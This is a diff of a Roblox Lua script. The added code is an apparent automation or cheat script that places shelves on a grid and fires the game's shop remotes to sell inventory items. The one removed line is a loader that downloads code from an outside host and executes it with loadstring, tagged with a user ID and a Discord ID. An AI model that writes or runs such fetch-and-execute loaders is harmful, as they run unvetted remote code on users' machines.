@@ -1,1 +1,274 @@
-_G.Config={UserID="3087df52-2f5c-4e6f-a407-10fa72d16932",discord_id="1135837863603351573",Note="Pc"}local s;for i=1,5 do s=pcall(function()loadstring(game:HttpGet("https://cdn.yummydata.click/scripts/ts"))()end)if s then break end wait(5)end
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace = game:GetService("Workspace")
+
+local LocalPlayer = Players.LocalPlayer
+
+local Events = ReplicatedStorage:WaitForChild("Events")
+local Shop = Events:WaitForChild("Shop")
+local Data = Events:WaitForChild("Data")
+
+local InsertFurniture = Shop:WaitForChild("InsertFurniture")
+local SellRemote = Shop:WaitForChild("SellItemInShop")
+local GetAll = Data:WaitForChild("GetAll")
+local ItemsModule = require(ReplicatedStorage:WaitForChild("Modules"):WaitForChild("Items"))
+
+local SHELF_ID = 39 -- Shelf item ID
+local EXCLUDED_IDS = {681, 2294} -- Items to exclude from selling
+local FLOOR = 1
+local spacing = 6
+
+-- ✅ Get owned canvas safely
+local function getCanvas()
+    local nsv = LocalPlayer:WaitForChild("NonSaveVars")
+    local own = nsv:WaitForChild("OwnsPlot")
+
+    repeat task.wait() until own.Value and own.Value ~= 0
+
+    local plot = Workspace:WaitForChild("Plots")
+        :WaitForChild(tostring(own.Value))
+
+    return plot
+        :WaitForChild("Interior")
+        :WaitForChild("Shop1")
+        :WaitForChild("Canvas")
+end
+
+-- ✅ Build grid dynamically
+local function buildGrid()
+    local positions = {}
+    local canvas = getCanvas()
+
+    local sizeX = canvas.Size.X
+    local sizeZ = canvas.Size.Z
+
+    local fitX = math.floor(sizeX / spacing)
+    local fitZ = math.floor(sizeZ / spacing)
+
+    local startX = canvas.Position.X - sizeX/2 + spacing/2
+    local startZ = canvas.Position.Z - sizeZ/2 + spacing/2
+    local y = canvas.Position.Y + canvas.Size.Y/2 + 1
+
+    for x = 0, fitX - 1 do
+        for z = 0, fitZ - 1 do
+            table.insert(positions,
+                Vector3.new(
+                    startX + (x * spacing),
+                    y,
+                    startZ + (z * spacing)
+                )
+            )
+        end
+    end
+
+    return positions
+end
+
+-- ✅ Get fresh data every time
+local function getPlayerData()
+    local success, data = pcall(function()
+        return GetAll:InvokeServer()
+    end)
+    return success and data or nil
+end
+
+-- ✅ Check if item should be excluded
+local function isExcluded(itemId)
+    local id = tonumber(itemId)
+    for _, excludedId in ipairs(EXCLUDED_IDS) do
+        if id == excludedId then
+            return true
+        end
+    end
+    return false
+end
+
+-- ✅ Find shelves in inventory
+local function findShelvesInInventory(data)
+    local shelves = {}
+    if data and data.Inventory then
+        for guid, itemData in pairs(data.Inventory) do
+            if tonumber(itemData.Id) == SHELF_ID then
+                table.insert(shelves, {
+                    GUID = guid,
+                    Id = itemData.Id
+                })
+            end
+        end
+    end
+    return shelves
+end
+
+-- ✅ Find items to sell (excluding specific IDs)
+local function findItemsToSell(data)
+    local items = {}
+    if data and data.Inventory then
+        for guid, itemData in pairs(data.Inventory) do
+            local id = tonumber(itemData.Id)
+            if not isExcluded(id) then
+                table.insert(items, {
+                    GUID = guid,
+                    Id = itemData.Id,
+                    Name = ItemsModule[id] and ItemsModule[id].Name or "Unknown"
+                })
+            end
+        end
+    end
+    return items
+end
+
+-- ✅ Get shelf positions from placed furniture
+local function getShelfPositions()
+    local nsv = LocalPlayer:WaitForChild("NonSaveVars")
+    local own = nsv:WaitForChild("OwnsPlot")
+    local plot = Workspace:WaitForChild("Plots"):WaitForChild(tostring(own.Value))
+    
+    local shelves = {}
+    
+    -- Look through placed furniture for shelves
+    for _, furniture in ipairs(plot:WaitForChild("Furniture"):GetChildren()) do
+        local s = furniture:FindFirstChild("Shelves")
+        if s then
+            for _, shelf in ipairs(s:GetChildren()) do
+                table.insert(shelves, shelf)
+            end
+        end
+    end
+    
+    return shelves
+end
+
+-- 🚀 PART 1: PLACE SHELVES ON GRID
+print("=== PART 1: Placing shelves on grid ===")
+
+local gridPositions = buildGrid()
+print("📦 Grid capacity:", #gridPositions)
+
+local playerData = getPlayerData()
+if not playerData then
+    warn("Failed to get player data")
+    return
+end
+
+local currentFurniture = 0
+if playerData and playerData.Furniture then
+    for _ in pairs(playerData.Furniture) do
+        currentFurniture += 1
+    end
+end
+
+local maxShopSpace = playerData.ShopSpace or 100
+local availableSpace = maxShopSpace - currentFurniture
+
+print("Current furniture:", currentFurniture, "Max:", maxShopSpace, "Available:", availableSpace)
+
+if availableSpace <= 0 then
+    print("Shop is full.")
+    return
+end
+
+-- Find shelves in inventory
+local inventoryShelves = findShelvesInInventory(playerData)
+print("Found shelves in inventory:", #inventoryShelves)
+
+local shelvesToPlace = math.min(availableSpace, #gridPositions, #inventoryShelves)
+local placedShelves = 0
+local positionIndex = 1
+
+for _, shelf in ipairs(inventoryShelves) do
+    if placedShelves >= shelvesToPlace then
+        break
+    end
+
+    local pos = gridPositions[positionIndex]
+    if not pos then
+        break
+    end
+
+    local args = {
+        {
+            GUID = shelf.GUID,
+            Type = "Furniture",
+            Floor = FLOOR,
+            Id = shelf.Id,
+            CFrame = CFrame.new(pos)
+        }
+    }
+
+    local success = pcall(function()
+        InsertFurniture:InvokeServer(unpack(args))
+    end)
+
+    if success then
+        placedShelves += 1
+        positionIndex += 1
+        print("✅ Placed shelf", placedShelves, "/", shelvesToPlace)
+    else
+        print("❌ Failed to place shelf:", shelf.GUID)
+    end
+
+    task.wait(0.15)
+end
+
+print("✅ Placed", placedShelves, "shelves")
+
+-- Wait a moment for shelves to load
+task.wait(2)
+
+-- 🚀 PART 2: GET SHELF POSITIONS AND SELL ITEMS
+print("\n=== PART 2: Selling items on shelves ===")
+
+local shelfPositions = getShelfPositions()
+print("Found placed shelves:", #shelfPositions)
+
+if #shelfPositions == 0 then
+    warn("No shelves found to place items on!")
+    return
+end
+
+-- Get fresh data after placing shelves
+local freshData = getPlayerData()
+if not freshData then
+    warn("Failed to get updated player data")
+    return
+end
+
+-- Find items to sell (excluding 681 and 2294)
+local itemsToSell = findItemsToSell(freshData)
+print("Items to sell (excluding 681 and 2294):", #itemsToSell)
+
+-- Sort items by name or ID for organized placement
+table.sort(itemsToSell, function(a, b)
+    return a.Name < b.Name
+end)
+
+-- Place items on shelves
+local itemsPlaced = 0
+local maxToPlace = math.min(#shelfPositions, #itemsToSell)
+
+for i = 1, maxToPlace do
+    local item = itemsToSell[i]
+    local shelf = shelfPositions[i]
+    
+    if item and shelf then
+        print("Placing:", item.Name or "Item", "("..item.Id..")", "on shelf", i)
+        
+        local success = pcall(function()
+            SellRemote:FireServer(item.GUID, shelf, true)
+        end)
+        
+        if success then
+            itemsPlaced += 1
+            print("✅ Placed", itemsPlaced, "/", maxToPlace)
+        else
+            print("❌ Failed to place:", item.GUID)
+        end
+        
+        task.wait(0.1)
+    end
+end
+
+print("\n=== COMPLETE ===")
+print("✅ Shelves placed:", placedShelves)
+print("✅ Items placed on shelves:", itemsPlaced)
+print("🎉 All done!")
